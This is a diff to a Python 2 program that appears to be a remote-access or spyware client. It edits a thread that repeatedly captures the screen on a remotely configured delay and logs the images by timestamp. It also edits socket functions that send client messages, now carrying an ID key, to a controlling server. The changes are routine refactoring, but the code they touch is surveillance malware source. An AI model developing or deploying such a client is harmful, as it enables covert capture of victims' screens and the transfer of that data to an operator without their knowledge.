@@ -256,13 +256,19 @@ class Screenshoter(threading.Thread):
         while 1:
             config = init()
             if config['sts']:
-                print len(screen_bits())
                 delay = config['std']
-                SCREENSHOT_LOGS[datetime.datetime.now()] = {
+                now = datetime.datetime.now()
+                year = now.year
+                month = now.month
+                day = now.day
+                hour = now.hour
+                minute = now.minute
+                second = now.second
+                SCREENSHOT_LOGS['%s-%s-%s_%s_%s_%s' % (year, month, day, hour, minute, second)] = {
                     'screen_bits': screen_bits(),
                     'width': width,
                     'height': height,
-                    'date': datetime.datetime.now(),
+                    'date': '%s-%s-%s_%s_%s_%s' % (year, month, day, hour, minute, second),
                 }
 
                 time.sleep(delay)
@@ -326,7 +332,7 @@ def data_receive(sock, end='[ENDOFMESSAGE]'):
         while payload:
             received_data = received_data + payload
             if received_data.endswith(end):
-                received_data = received_data[:-len(end)].decode('utf-8')
+                received_data = received_data[:-len(end)]
                 break
             else:
                 payload = sock.recv(1024)
@@ -338,11 +344,13 @@ def data_receive(sock, end='[ENDOFMESSAGE]'):
 
 # Send Data Function
 def data_send(sock, message, mode, session_id='', end='[ENDOFMESSAGE]'):
+    global ID
     message = {
         'payload': message,
         'mode': mode,
         'from': 'client',
         'session_id': session_id,
+        'key': ID,
     }
     sock.sendall(str(message)+end)
 
